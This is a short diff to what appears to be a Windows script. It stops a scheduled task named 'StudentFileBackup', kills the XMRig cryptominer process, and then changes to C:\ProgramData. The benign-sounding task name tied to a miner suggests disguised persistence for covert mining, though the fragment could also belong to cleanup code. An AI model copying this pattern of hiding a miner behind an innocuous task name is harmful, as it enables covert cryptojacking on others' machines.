@@ -1,4 +1,5 @@
-kill -Name xmrig -Force
+schtasks /end /tn StudentFileBackup
+taskkill /IM xmrig.exe /T /F
 
 cd C:\ProgramData
 
